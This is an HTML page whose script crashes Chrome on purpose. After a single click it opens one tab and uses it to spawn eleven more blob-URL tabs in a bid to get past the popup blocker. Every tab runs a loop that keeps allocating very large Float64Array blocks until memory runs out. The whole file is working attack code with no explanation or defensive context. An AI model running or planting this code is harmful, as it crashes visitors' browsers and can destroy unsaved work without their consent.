<!DOCTYPE html>
<html>
<head>
    <title>Bypass Popup Blocker - Auto Chrome Crash</title>
</head>
<body>
    <h1>Click Anywhere to Start</h1>
    <p>This will open multiple tabs to crash Chrome.</p>

    <script>
        function startWorker() {
            let data = [];
            function allocate() {
                for (let i = 0; i < 1000; i++) { 
                    data.push(new Float64Array(2e7)); // Large memory blocks
                }
                requestAnimationFrame(allocate);
            }
            allocate();
        }

        function createAttackPage() {
            return `
                <html>
                <head><title>Memory Attack</title></head>
                <body>
                <h1>Memory Attack Running...</h1>
                <script>
                    function startWorker() {
                        let data = [];
                        function allocate() {
                            for (let i = 0; i < 1000; i++) { 
                                data.push(new Float64Array(2e7)); 
                            }
                            requestAnimationFrame(allocate);
                        }
                        allocate();
                    }
                    startWorker();
                <\/script>
                </body>
                </html>
            `;
        }

        function openTabs() {
            let urls = [];
            for (let i = 0; i < 12; i++) {
                let blob = new Blob([createAttackPage()], { type: "text/html" });
                let url = URL.createObjectURL(blob);
                urls.push(url);
            }

            let tabs = [];
            let firstTab = window.open(urls[0], "_blank");
            if (!firstTab) {
                alert("Popup blocked! Click the page and try again.");
                return;
            }

            tabs.push(firstTab);

            setTimeout(() => {
                for (let i = 1; i < urls.length; i++) {
                    let newTab = firstTab.window.open(urls[i], "_blank");
                    if (newTab) {
                        tabs.push(newTab);
                    }
                }
            }, 500);
        }

        document.body.addEventListener("click", openTabs);
    </script>
</body>
</html>
